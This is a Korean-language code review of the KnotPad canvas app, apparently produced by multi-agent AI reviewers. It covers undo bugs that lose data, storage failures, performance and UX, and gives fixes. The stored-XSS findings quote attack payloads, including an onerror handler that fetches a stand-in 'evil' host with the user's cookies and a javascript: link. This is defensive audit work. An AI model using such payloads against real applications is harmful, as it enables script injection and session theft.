# KnotPad 전체 코드 리뷰

> 멀티에이전트 코드 리뷰 결과 (41개 에이전트, 5개 분석 차원 × 적대적 검증 × P0–P3 분류).
> 30개 발견 제기 → 적대적 검증으로 **3개 반증, 27개 확정** → P0/P1 6건은 high-effort 심화 검증 완료.
> 분석 차원: ① UX/UI·작성/편집/연결 경험 ② 영속성/신뢰성 ③ 취약점·코드 완성도 ④ 퍼포먼스 ⑤ 교차 모듈 상호작용(런타임 emergent 버그).

## 집계

| 우선순위 | 건수 | 비고 |
|---|---|---|
| **P0** | 0 | 즉각적 전체 손상/크래시는 없음 |
| **P1** | 6 (실질 5개) | 데이터 손실 2 + 저장 XSS 3 |
| **P2** | 11 | 영속성 위험 + 드래그 성능 |
| **P3** | 10 | UX 마찰 + 폴리시 |
| 반증됨 | 3 | 검증에서 재현 불가로 기각 |

> P1 6건 중 "미디어 삭제 후 Undo 데이터 손실"은 **영속성·교차로직 두 에이전트가 독립적으로 동일 버그를 짚어 교차 확인**(신뢰도 매우 높음). 따라서 실질 P1 이슈는 5개다.

## 권장 수정 순서

1. **P1-C/D/E (저장 XSS)** — 로드/Import 경계 한 곳 정화 + `sanitizeUrl`/CSP. 저위험·고가치, C·E는 무상호작용 자동 실행이라 최우선.
2. **P1-B (삭제 Undo 모델)** — emit 위치 한 줄 영역 이동, 회귀 위험 거의 없음.
3. **P1-A (미디어 삭제 GC)** — 침습적이라 설계·테스트 동반. 지연 GC + 참조 카운팅.
4. **P2 영속성**(쿼터/FS 게이팅/고아 정리) → **P2 성능**(드래그 핫패스).
5. P3는 폴리시 단위로.

---

# 🔴 P1 — 우선 수정 대상 (심화 검증 완료)

## P1-A. 미디어 삭제 후 Undo = 영구 데이터 손실 *(2개 에이전트 교차 확인)*

- **위치**: `js/items.js:2799-2809` (deleteItem 즉시 blob 삭제) · `js/ui.js:324-335` (restoreState) · `js/items.js:1162-1209` (reloadMediaSource 복구 막다른길) · STATE_SAVE-before-delete `js/items.js:2780-2782`
- **차원**: 영속성 + 교차로직 (중복 확인)

**근본 원인**
`deleteItem()`이 미디어 삭제를 **즉시 파괴적**으로 처리한다 — `deleteMedia(id)`(IndexedDB hard delete, `storage.js:56-60`), `deleteMediaFromFileSystem(id)`(`fsDirectoryHandle` 설정 시, `storage.js:433`), `revokeObjectURL`+`blobURLCache.delete`(`items.js:2804-2808`). 반면 Undo는 **메타데이터 전용 스냅샷**이다: `saveState()`(`ui.js:204-220`)는 content를 `"media_xxx"` 문자열로만 직렬화(`line 213`)하고 blob 바이트는 절대 저장하지 않는다. `deleteSelectedItems()`는 삭제 **전** STATE_SAVE로 스냅샷 A를 캡처(`items.js:2780`)한 뒤 삭제하므로, 스냅샷 A가 `media_xxx`를 참조하는 동안 blob은 모든 백킹 저장소에서 사라진다.

Undo 시 `restoreState()`(`ui.js:293-358`)가 `createItem(d, true)`로 아이템을 재생성하지만 blobURLCache에서 URL이 제거된 상태라 `!state.blobURLCache.has(d.content)`(`line 324`)가 true → 빈 src + `media-loading` 클래스로 빌드. `setupMediaErrorHandler`의 빈-src 분기(`items.js:1241-1243`)가 `reloadMediaSource`를 호출하나, `loadMediaFromFileSystem`/`loadMedia` 모두 삭제된 레코드에 대해 null 반환 → `MAX_RETRIES=2` 후 `media-load-failed`(`items.js:1167`) 추가 후 포기. **바이트를 복원하는 경로가 존재하지 않는다.**

**트리거**: 이미지 추가 → 삭제(`deleteSelectedItems` → `deleteItem(item, false)`) → `Ctrl+Z`. 매우 흔한 "실수 후 되돌리기" 동작에서 사용자 미디어가 **영구 소실**되어 깨진 placeholder로 대체된다.

**영향 범위**: 모든 image/video 아이템(`media_*`). 삭제 진입점 3곳 모두 동일 경로 — Delete/Backspace(`events.js:363-364` → deleteSelectedItems), 컨텍스트 메뉴(`ui.js:1567-1569`), 아이템 삭제 버튼(`items.js:1498-1501`). IndexedDB와 File System 양쪽 영향(FS는 핸들 연결 시). 다중선택 삭제는 한 번에 여러 미디어 파괴. **연결(그래프 구조)은 정상 복원**(`restoreState` lines 344-355)되므로 손실은 미디어 콘텐츠에 국한. 현재 media id는 아이템마다 고유해 다른 live 아이템을 손상시키진 않음 — 피해는 삭제된 아이템의 Undo 복구에 한정.

**수정 방안 (지연 GC)**
`deleteItem`(`items.js:2799-2809`)에서 `deleteMedia`/`deleteMediaFromFileSystem`를 삭제 시점에 호출하지 않는다. 대신:
1. 인메모리 blob URL만 드롭(재생성 가능)하고 media id를 `state.pendingMediaDeletes`(Set)에 기록.
2. `collectOrphanMedia()` 헬퍼: `state.items` + **undoStack·redoStack 양쪽 모든 스냅샷의 `items[].content`** 의 media id를 스캔, pending 중 어디에도 참조되지 않는 id만 IndexedDB/FS에서 실제 삭제.
3. GC 실행 시점: 스냅샷이 `MAX_HISTORY=50` 넘어 evict될 때(`ui.js:245`), 캔버스 저장/로드, 세션 종료, clear-all.
4. **참조 카운팅** 추가(복사/붙여넣기로 media id 공유 대비).

**회귀 위험**: GC가 안정적으로 안 돌면 blob 누수 → 저장소 무한 증가. evict/save/clear 트리거 확실히 + **redoStack도 반드시 스캔**(누락 시 redo가 필요로 하는 바이트를 조기 삭제). FS 경로의 `deleteMediaFromFileSystem`는 fire-and-forget async라 지연이 오히려 안전. `saveState` 직렬화 변경 불필요.

**우선순위**: 흔한 동작에서 **사용자가 알아채지 못하는 조용한 영구 손실**이라 크래시보다 나쁠 수 있음 → P1. 단 GC 도입이 다소 침습적이므로 핫픽스보다 신중한 테스트 동반.

---

## P1-B. 다중삭제가 Undo 단계로 기록되지 않음 → Undo가 삭제 아이템을 부활시킴

- **위치**: `js/items.js:2778-2789` (deleteSelectedItems) · 대조군 `js/items.js:2827-2836` (단일 deleteItem은 AFTER 스냅샷) · `js/ui.js:204-248` (saveState dedup 233-241) · `js/ui.js:274-281` (undo) · 로드 시드 `js/ui.js:632-644`
- **차원**: 교차로직

**근본 원인**
앱의 Undo 모델은 "변경 **후** 스냅샷": `undo()`(`ui.js:274-281`)는 `undoStack.length>=2`를 요구하고, top을 redo로 push한 뒤 `undoStack[length-1]`을 복원하므로 스택 top은 항상 live state를 반영해야 한다. 모든 변경 경로가 이를 준수 — addMemo/addKeyword 호출부(`app.js:100-101, 107-108`), setItemColor(`items.js:2641`), setItemFontSize(`2657`), duplicateItem(`2853`), 그리고 `update=true`인 단일 deleteItem(`items.js:2833`, splice 후 emit).

**`deleteSelectedItems`만 유일하게 위반**: `line 2780`에서 모든 아이템이 아직 존재하는 동안 STATE_SAVE를 **먼저** emit한 뒤 `deleteItem(item, false, true, false)`(`line 2782`)로 삭제 — `update=false`가 정상적인 post-delete STATE_SAVE를 차단(`items.js:2827-2833`). `eventBus.emit`은 동기(`events-bus.js:63-78`)이고 STATE_SAVE는 `saveState()`에 직결(`app.js:72`)되므로, 선행 emit은 live==top인 상태에서 saveState를 실행 → dedup(deep JSON compare, `ui.js:233-241`)이 **no-op 반환**. 루프 내 연결 삭제도 `save=false`(`items.js:2797`)라 스냅샷 안 찍힘. 결과: **다중삭제는 스냅샷을 전혀 push하지 않는다.**

**트리거 (2가지 실패)**
- **(a)** 캔버스 로드 직후(undoStack 길이 1, live==top) 선택+삭제: 스냅샷 미발생, 스택 길이 1 유지 → `undo()`가 `ui.js:275`에서 즉시 return → **Ctrl+Z 무반응, 삭제 영구 복구 불가**.
- **(b)** 히스토리 있는 상태에서 삭제(no-op 스냅샷, 아이템은 제거됨) → 메모 추가(saveState가 S1=축소+신규메모를 S0=원본전체 위에 push) → `Ctrl+Z`가 S1을 pop하고 `undoStack[length-1]=S0` 복원 → **삭제했던 아이템 부활 + 방금 추가한 메모 소실** + redo desync. 정상 편집 중 상태 손상.

오토세이브(`AUTOSAVE_TRIGGER`, `items.js:2788`)가 축소된 state + stale undoStack을 저장하므로 reload 시 깨진 히스토리가 이월된다.

**수정 방안**: `line 2780`의 선행 `eventBus.emit(Events.STATE_SAVE)` 제거 → 삭제 루프 **후**(예: `AUTOSAVE_TRIGGER` 부근 `line 2788`) STATE_SAVE를 1회 emit. 루프 내는 `update=false` 유지(아이템당 N회 스냅샷 방지). 나머지 모든 경로와 동일한 snapshot-after 패턴이 됨.

**회귀 위험**: 낮음. emit이 정확히 1회만 발생하도록(`deleteItem`의 update를 true로 바꾸지 말 것 — N회 emit + per-item `arrangeByColor` 부작용 유발). trailing saveState의 dedup이 여전히 정상 no-op 처리. **국소 변경, 가치 대비 위험 매우 낮음 — 우선 처리 권장.**

---

## P1-C. 저장 XSS — 이미지/비디오 src 미이스케이프 (로드/Import)

- **위치**: `js/items.js:1259-1268` (주입) · DOM sink `js/items.js:1342`
- **차원**: 보안

**근본 원인**: 이미지/비디오 렌더 시 `mediaSrc = cfg.content.startsWith('media_') ? blobURLCache... : cfg.content;` 로 만든 뒤 **이스케이프 없이** HTML 문자열에 보간 — `html = '<img class="item-image" src="' + mediaSrc + '">'`(`line 1264`), video도 동일(`line 1268`). non-`media_` 분기는 `cfg.content`(저장/Import JSON의 완전 공격자 제어 문자열)를 속성값에 직접 주입. `createItem`은 로드(`ui.js:609`)·Import(`ui.js:2900-2906`)에서 직접 호출되며, 캔버스 파일은 FS(`storage.js:375-382`, 검증 없는 `JSON.parse`)·Import .json에서 신뢰 없이 읽힌다.

**트리거**: 캔버스 열기/Import 시 image/video `content`가 non-`media_` 문자열이면 렌더 시 **무상호작용 자동 실행**. 예: `x" onerror="fetch('//evil/'+encodeURIComponent(document.cookie))` → `<img src="x" onerror="...">`, src="x" 로드 실패 → onerror 즉시 발화. `esc()`는 keyword/link에만 적용되고 src에는 미적용. `index.html`에 **CSP 부재**.

**영향**: 앱 origin에서 임의 JS 실행 → 전 캔버스/미디어/설정 탈취, File System 디렉터리 핸들 악용. KnotPad 저장 폴더가 OneDrive 하위라 **동기화된 변조 파일**이 현실적 전달 경로.

**수정 방안**: `src`를 HTML 문자열에 보간하지 말 것. `document.createElement` 후 `element.src = mediaSrc`(**프로퍼티 할당은 HTML 파싱 안 함**). 최소한 `mediaSrc`를 `esc()` 처리 + 스킴이 `blob:`/`data:image`/`https:`인지 검증. 안전 URL이 아닌 non-media content는 거부.

---

## P1-D. 저장 XSS — 링크 href의 `javascript:` URL (`esc()`는 스킴 무력화 안 함)

- **위치**: `js/items.js:1307` · sink `js/items.js:1342` · 2차 sink `js/items.js:2286` (window.open)
- **차원**: 보안

**근본 원인**: `esc()`(`utils.js:7-11`)는 HTML 엔티티 인코딩(textContent→innerHTML 왕복)만 한다. **URL 스킴 검증/제거를 안 한다.** `javascript:alert(document.cookie)`는 HTML 특수문자가 없어 esc()를 바이트 그대로 통과. `items.js:1307`에서 `<a class="link-url" href="${esc(linkUrl)}" target="_blank">`로 렌더되어 `innerHTML`(`line 1342`)로 주입 → **실제 동작하는 `<a href="javascript:...">` 생성**. 스킴 검증(`isValidUrl`, `ui.js:2307-2319`, http/https만)은 **모달 경로(submitLinkModal `ui.js:2347`)에만** 연결됨. 신뢰 경계를 넘는 두 경로 — 로드 `createItem(d,true)`(`ui.js:609`)와 Import(`ui.js:2900`) — 는 `d.content.url`을 검증 없이 통과. CSP 부재.

**트리거**: 공격자가 link 아이템 `content.url = "javascript:..."`로 export JSON 변조 → 피해자가 Import(`ui.js:2900`) 또는 동기화된 캔버스 열기(`ui.js:609`) → 링크 클릭 시 앱 origin에서 JS 실행. 2차 sink `window.open`(`items.js:2286`)은 현대 브라우저가 `javascript:` URL을 차단하므로 약한 벡터이나, href 앵커는 완전 익스플로잇 가능. `target="_blank"` + `rel` 부재로 reverse-tabnabbing도 노출.

**수정 방안**:
1. `js/utils.js`에 `sanitizeUrl(u)` 신설 — trim 후 `new URL(u, location.href)` 파싱, `protocol === 'http:' || 'https:'`만 통과(스킴 없는 bare URL은 기존 `https://` 보정 유지), 그 외(`javascript:`/`data:`/`vbscript:`)는 `''`/`#` 반환.
2. `items.js:1296-1307`에서 `linkUrl`을 `sanitizeUrl` 통과 후 `href="${esc(safeUrl)}"` (esc는 엔티티 인코딩용 유지). favicon/window.open 로직도 safeUrl 사용.
3. `items.js:2286` 2차 sink도 `sanitizeUrl` 적용 + `window.open(safe, '_blank', 'noopener,noreferrer')`.
4. 앵커에 `rel="noopener noreferrer"` 추가.
5. (방어심화) `index.html`에 CSP 메타 — 단 인라인 핸들러/외부 favicon fetch 감사 후 별도 후속.

**회귀 위험**: 낮음~중간. non-http(s) 링크는 빈/`#` href로 렌더(내비게이션 불가) — 허용 가능. bare URL(`example.com`) 보존을 위해 sanitizeUrl 내 기존 `https://` 보정 유지. CSP는 인라인 핸들러/외부 fetch를 깰 수 있어 별도 작업.

---

## P1-E. 저장 XSS — 메모 콘텐츠가 로드 시 미정화 (normalize만 수행)

- **위치**: sink `js/items.js:1291` · `js/items.js:265-271` parseContent · `js/items.js:957-1009` normalizeMemoHtml · 라이브 렌더 `js/items.js:1342` · 로드 호출부 `js/ui.js:609`, Import `js/ui.js:2900`
- **차원**: 보안

**근본 원인**: 메모는 `parseContent(cfg.content)` → `normalizeMemoHtml`(`items.js:265-271`)로 렌더. `normalizeMemoHtml`(`items.js:957-1009`)은 innerHTML 설정 후 div/p/br 재구조화만 하고 **태그 화이트리스트/속성 제거를 전혀 안 한다.** 화이트리스트 sanitizer `sanitizeClipboardHtml`(`items.js:1012-1077`)은 **paste 경로(`items.js:809`)에만** 적용되고 로드 경로에는 없다. 따라서 Import/변조 캔버스 JSON의 메모 content가 raw HTML로 렌더된다.

**트리거**: 변조된 all-canvases JSON Import(`ui.js:2900` → createItem `ui.js:609`) 또는 변조 저장 캔버스 열기. 메모 content `<img src=x onerror=alert(document.cookie)>` 또는 `<svg onload=...>`가 **로드 시 무상호작용 실행**. innerHTML은 `<script>`를 실행하지 않지만 img/svg의 인라인 이벤트 핸들러는 발화.

**수정 방안**: 로드 경로의 `parseContent`(또는 로드 시점) 안에서 메모 content를 `sanitizeClipboardHtml`(또는 이벤트 핸들러 속성 + 비허용 태그를 제거하는 동등 화이트리스트)에 통과. paste뿐 아니라 로드/Import 경계 전체를 커버.

> **C·D·E 공통**: 세 건 모두 **저장/Import된 캔버스 JSON을 신뢰 없이 DOM에 주입**하는 동일 뿌리. 로드/Import 경계 한 곳에서 묶어 정화 + CSP 추가가 효율적.

---

# 🟠 P2 — 신뢰성·성능 (11건)

## 영속성 (5)

### localStorage 쿼터 초과가 File System 저장까지 중단
- **위치**: `js/ui.js:503-517`
- `saveCurrentCanvas`가 동일 try 블록에서 localStorage 먼저 → FS. `localStorage.setItem`이 QuotaExceededError를 던지면 catch로 점프, `saveCanvasToFileSystem`(`line 506`)에 **도달 못 함**. FS 백엔드를 쓰는 사용자도 양쪽 모두 미저장, 피드백은 transient 토스트뿐. 이미지는 IndexedDB blob이라 쿼터에 기여 안 함 → 누적 텍스트로 트리거.
- **수정**: FS 저장을 localStorage와 독립적으로(또는 먼저), `setItem`을 별도 try/catch로. FS 사용 시 undoStack/redoStack은 localStorage에 안 쓰는 것 고려.

### Undo/Redo 스냅샷(최대 50개)을 캔버스별 localStorage에 직렬화
- **위치**: `js/ui.js:499-500` (saveCurrentCanvas), `js/ui.js:3043-3044` (saveToLocalStorageSync), 스냅샷 deep-copy `js/ui.js:213`, 로드 시 재적재 `js/ui.js:633-640`, `MAX_HISTORY=50` `js/constants.js:14`
- 각 스냅샷은 전체 아이템(전체 메모 HTML 포함) + 연결의 deep copy → 캔버스가 자기 콘텐츠의 ~50배까지 저장. 위 쿼터 실패의 주 동인 + 매 오토세이브 JSON 비대.
- **수정**: undo/redo 스택을 localStorage에 영속화하지 않음(메모리 보관, 또는 capped/diff 히스토리). 영속화 원하면 FS 전용.

### 캔버스 삭제 시 미디어 blob 영구 고아
- **위치**: `js/ui.js:815-837` (deleteCanvas)
- 캔버스 엔트리·localStorage 데이터 키·FS 캔버스 JSON은 제거하나 그 캔버스만 참조하던 미디어 blob은 미삭제. 참조 카운팅/정리 패스 없음 → IndexedDB·FS media/ 디렉터리에 무한 누적.
- **수정**: splice 전 캔버스 데이터 로드 → 해당 캔버스 고유 media id 수집(타 캔버스 미참조) → `deleteMedia`/`deleteMediaFromFileSystem` 호출.

### FS 핸들 권한 미승인 상태에서 저장 조용히 실패
- **위치**: `js/storage.js:196-199` (needs-permission 상태로 핸들 설정) · `js/storage.js:327-342, 362-373` (silent-catch FS 쓰기) · `js/ui.js:455-457, 505-507` (truthy-handle 분기) · `js/app.js:438-451` (reconnect 시 reload 없음)
- `tryRestoreFsConnection`이 권한이 `prompt`여도 `fsDirectoryHandle`을 할당 → truthy라 이후 모든 저장이 FS 쓰기 분기 진입 → `createWritable()`이 권한 부족으로 throw → catch가 console.error로만 삼킴. 사용자는 폴더가 사용 중이라 믿지만 **세션 내내 디스크에 안 써짐**. reconnect 성공해도 `loadCanvases()` 미호출이라 FS 재읽기 없음.
- **수정**: needs-permission 상태에서 쓰기용으로 활성 취급 안 함(핸들 존재가 아닌 권한 확정 플래그로 게이팅), reconnect 성공 시 현재 상태를 FS에 신규 저장.

## 성능 — 드래그/리사이즈 매 mousemove (throttle 없음, `events.js:147`)

> 아래 수정안 모두 **시각적 출력 불변** — 동일 결과를 더 적은 작업으로.

### 모든 연결 재계산 (영향받는 엣지만 갱신해야)
- **위치**: `js/events.js:190` (드래그), `js/events.js:233` (리사이즈) → `js/connections.js:446-448` (updateAllConnections) → `updateConnection`(`149-169`)
- 드래그/리사이즈 시 매 mousemove가 `updateAllConnections()` → 전 연결의 path/arrow/label 재계산. 실제 변한 건 이동 아이템에 붙은 연결뿐. O(전체 연결 수)/프레임.
- **수정**: 드래그/리사이즈 시작 시 from/to가 selectedItems(또는 리사이즈 아이템)인 연결 subset을 미리 계산, mousemove에선 그 subset만 갱신. 전체 재구축(`updateAllConnections`)은 load/restore에 유지.

### 화살표 SVG를 매 프레임 remove+recreate
- **위치**: `js/connections.js:300-443` (remove `301-304`, recreate `390-442`)
- `updateConnectionArrow`가 매번 기존 arrow `<g>`를 제거하고 polygon 자식과 함께 새로 생성+append. 매 mousemove 60회/초 DOM churn + GC churn.
- **수정**: 기존 `<g>`/`<polygon>` 재사용 — `points`/`fill` 속성만 갱신. polygon 개수가 바뀔 때(dir single↔both)만 재생성.

### 라벨 중점에 강제 동기 reflow
- **위치**: `js/connections.js:255-264` (getPathMidpoint), 호출 `213`
- 라벨 있는 연결마다 `getTotalLength()`/`getPointAtLength()` → 매 프레임 SVG 강제 reflow.
- **수정**: arrow 코드가 이미 쓰는 해석식 Bezier 중점(`bezierPoint(p0,p1,p2,p3,0.5)`)으로 대체 → layout API 제거, 시각 차이 없음.

### saveState()가 체크포인트마다 문서 전체를 2회 stringify
- **위치**: `js/ui.js:204-248` (clone `213`, dedup 이중 stringify `236-237`)
- dedup 비교를 위해 `JSON.stringify(lastState)` + `JSON.stringify(stateData)` 둘 다 수행. 드래그/리사이즈 release마다(`events.js:281,287`) 호출. 대형 캔버스에서 release/편집 랙.
- **수정**: 새 stateData를 1회 직렬화 후, 이전에 저장해 둔 직렬화 문자열과 비교(스냅샷 옆에 직렬화형 보관) → 체크포인트당 stringify 1회 절감.

### 미니맵을 매 프레임 innerHTML 문자열로 전체 재구축
- **위치**: `js/ui.js:1337-1376`
- 전 아이템 bounds 재계산 → 연결당 `<line>`, 아이템당 `<div>` 문자열 concat → `innerHTML` 설정(전체 reparse) + 아이템/연결마다 `classList.contains` 읽기. pan/drag/resize 매 프레임(rAF throttle). hidden 상태에서도 작업 수행.
- **수정**: pan 시엔 viewport 사각형만 변하므로 정적 아이템/연결 마크업 캐시, `.minimap-viewport` 위치/크기만 갱신. 아이템/연결 실제 변경 시에만 전체 재구축. filtered-out 읽기도 캐시.

## 성능 (P3 경계)

### updateTransform이 매 pan/zoom 프레임에 root CSS 변수 기록
- **위치**: `js/viewport.js:21-25`
- 매 프레임 `--counter-scale`, `--counter-scale-soft` setProperty + `low-zoom` toggle. pan 중(scale 불변)에도 변수 참조 전 요소의 스타일 무효화 → 불필요한 style recalc.
- **수정**: scale이 실제 변했을 때만(`lastAppliedScale` 추적) 변수/클래스 갱신. pan-only 프레임은 `canvas.style.transform`만.

---

# 🟡 P3 — UX 마찰·폴리시 (10건)

## UX

### 링크 노드는 선택 자체가 불가 — 클릭하면 무조건 새 탭
- **위치**: `js/items.js:2257-2289`
- 빠른 클릭(dx/dy<5px, <300ms)이 250ms 더블클릭 감지 후 `window.open` 무조건 스케줄. `e.shiftKey`/`e.ctrlKey` 가드 없음 → Shift+클릭 다중선택도 탭 오픈. 색상 지정/연결/정밀 이동/다중선택 위해 선택만 하려 해도 브라우저 탭 발생.
- **수정**: 명시적 제스처로만 오픈 — 이미 선택된 노드의 2차 클릭, 또는 `<a>`/전용 버튼으로만, 또는 shift/ctrl 시·미선택 시 `window.open` 스킵.

### 메모 편집 중 Esc가 전역 상태 파괴 (편집 종료 가드 없음)
- **위치**: `js/events.js:356-362`
- Escape 분기가 focus 무관하게 무조건 실행 → contenteditable 안에서도 `cancelConnection(true)`, `closeLinkModal()`, `closeSearch()`, `closeSettingsModal()`, `deselectAll()` 발화. 메모는 blur 안 됨(기대 동작 "편집 종료"는 안 일어남). Delete(`363`)·Space(`368`) 분기는 editable 가드가 있는데 Escape만 없음.
- **수정**: `isEditableTarget`이면 Escape를 active editable의 `blur()`로 제한하고 return.

### 큰 메모 스크롤 경계에서 휠 줌 먹통
- **위치**: `js/events.js:56-58`
- 스크롤 가능한 메모 위에서 경계 도달 후 더 스크롤 시(atBottom&&down / atTop&&up) `preventDefault()`+return → 줌 안 됨, 피드백 없음. 큰 메모가 화면 대부분 차지 시 줌아웃 불가.
- **수정**: 경계에서 캔버스 줌으로 fall-through, 또는 메모 편집/포커스 중일 때만 인터셉트.

### toggleHeading의 execCommand 폴백이 다중 단락에서 형식 섞임
- **위치**: `js/items.js:2538-2595`
- 기존 H1/H2/H3 없으면 `execCommand('formatBlock','h1')` 폴백 → 다중 단락 DIV 선택 시 각 블록을 H1로(브라우저 의존), 다음 토글은 anchorNode 단일 블록만 검사 → H1/H2 혼재. deprecated API.
- **수정**: formatBlock 폴백을 명시적 블록 교체(h1 생성 후 자식 이동)로, 선택 내 모든 블록 순회하며 수동 사이클 경로와 일관되게.

### Box-select의 Shift+drag 토글 불가 + 빈 드래그가 선택 해제
- **위치**: `js/events.js:90-108, 254-273` · `js/items.js:2662`
- mousedown에서 shift면 deselectAll 스킵(정상)이나 mouseup의 `selectItem(item, true)`는 항상 ADD만 → 박스로 제거 불가. non-shift 빈 드래그는 mousedown에서 이미 deselectAll. 연결선만 덮는 박스는 아무것도 선택 안 함.
- **수정**: shift+box는 멤버십 토글, sub-threshold 드래그는 선택 해제 전 plain click 취급.

## 영속성

### Export가 z-index/manuallyResized/view 누락
- **위치**: `js/app.js:218-241` (export), `js/app.js:343-363` (import)
- export는 id/type/x/y/w/h/content/color/fontSize/textAlign/locked + from/fh/to/th/dir/label만 기록 → `z`, `manuallyResized`, 캔버스 `view`(scale/offset) 누락. import 시 `highestZ=1` 리셋, z는 생성순, manuallyResized 소실, 뷰포트 미복원. export→import 왕복 시 적층순서·자동크기 변경.
- **수정**: export 객체에 z, manuallyResized(+선택적 view/itemId/highestZ) 포함, import 시 복원(saveCurrentCanvas/loadCanvasData와 일치).

### originalPositions가 undo 스냅샷에 미포함 (색상그룹 모드 desync)
- **위치**: `js/ui.js:204-230, 293-358, 274-291` · `js/state.js:132-133` · `js/items.js:3087-3100` — **부분 확인(partially_confirmed)**
- `colorGroupModeActive`/`originalPositions`는 saveCurrentCanvas는 저장하나 saveState 스냅샷엔 미캡처/미재적용. 색상그룹 모드 중 add/delete/drag 후 undo하면 originalPositions가 stale → 모드 해제 시 잘못된 위치. 단순 "이동→undo→해제"는 손상 없음. 좁은 엣지 케이스, 재토글로 복구 가능.
- **수정**: 스냅샷에 `colorGroupModeActive`/`originalPositions` 포함·복원, 또는 undo/redo가 색상그룹 경계를 넘으면 originalPositions 무효화.

## 교차로직 / 보안

### 페이드 삭제 직후 Undo 시 고스트 DOM 노드
- **위치**: `js/items.js:2815-2824` + `js/connections.js:460-484` + `js/ui.js:293-358` — **부분 확인**
- withFade 삭제 시 state 배열에선 즉시 splice되나 DOM 요소는 `animationend`까지(~150ms) 부착 유지. `restoreState`는 현재 state 배열만 순회해 제거하므로 fading 중인 orphan 노드를 못 지우고 새 요소 생성 → 같은 좌표에 중복 노드 ~150ms. 선택/미니맵 혼란 가능.
- **수정**: pending-fade 요소를 Set으로 추적, restoreState/switchCanvas/import 시작 시 제거(또는 undo 임박 시 fade 스킵, 또는 pending fade 타이머 취소).

### STATE_CHANGED 이벤트 구독자 0 (낭비 + 재진입 잠재 footgun)
- **위치**: `js/state.js:69-75, 235-239` (emit) · `js/app.js:72-92` (구독 없음)
- Proxy set 핸들러가 모든 non-silent 쓰기마다 STATE_CHANGED emit하나 리스너 없음. pan/zoom 핫패스(setScale/setOffset)에서 payload 생성+Map 조회 낭비. 향후 STATE_CHANGED 리스너가 state를 쓰면 setter 재진입 → 무한루프(depth guard 없음).
- **수정**: 미사용 emit 제거, 또는 setter에 재진입 depth guard + "핸들러는 동기적으로 같은 키를 쓰지 말 것" 문서화.

### 빠른 캔버스 전환 시 itemCount/updatedAt 오기입
- **위치**: `js/ui.js:506-514` · race `js/ui.js:667-699` (switchCanvas), `js/ui.js:3003-3004` (un-awaited autosave) · `js/storage.js:362-373` — **부분 확인**
- `saveCurrentCanvas`는 데이터를 동기 스냅샷(정상)하나 `await saveCanvasToFileSystem` 후 `c.itemCount = state.items.length`를 읽음. 오토세이브가 await 중일 때 switchCanvas가 items를 비우면 await 후 읽기가 0/잘못된 count 기록. **콘텐츠는 무손상, 메타데이터만**(사이드바 카운트/updatedAt). 검증서 보고와 달리 영향받는 건 대상(신규) 캔버스.
- **수정**: await **전**에 itemCount와 대상 캔버스 레코드/id를 캡처, await 후 captured id로 메타데이터 적용(live `currentCanvasId`/`items` 사용 금지).

### saveMedia/saveMediaBatch가 이유 없는 reject() → unhandled rejection 가능
- **위치**: `js/storage.js:38, 42` · 트리거 `js/ui.js:3150, 3161` (handleFile), fire-and-forget 호출 `js/app.js:131`, `js/events.js:412, 509` — **부분 확인**
- mediaDB 불가/트랜잭션 에러 시 bare `reject()`(Error 없음). handleFile이 fire-and-forget 호출되고 `img.onload = async` 내부 await가 캐치 안 됨 → `undefined` reason의 unhandledrejection. mediaDB null(incognito/스토리지 비활성) 또는 QuotaExceededError 시 발생. 복구 가능하나 관측성 저하.
- **수정**: `reject(new Error('...'))` 서술적 메시지(가능하면 `req.error`/`tx.error`), 모든 호출부 await/catch.

---

# 부록 — 반증된 3건

적대적 검증에서 코드상 트리거를 재현할 수 없어 기각된 발견이 3건 있다(상세 미기록). 27개 확정 발견만 본 문서에 반영됨.

# 부록 — 분석 방법론

- **1단계 Review**: 5개 finder 에이전트가 차원별로 실제 코드를 읽고 구조화된 발견 제기(UX 7, 영속성 7, 보안 5, 성능 6, 교차로직 5 = 30건).
- **2단계 Verify**: 각 발견마다 적대적 검증 에이전트가 인용된 `file:line`을 직접 재확인, 트리거 재현 가능성 검토, 반증 시도 후 P0–P3 부여. 3건 반증.
- **3단계 Deepen**: 확정 P1 6건을 high-effort 에이전트가 근본 원인·영향 범위·수정안·회귀 위험·우선순위까지 재검토.
- 총 41개 에이전트, tool 호출 459회.
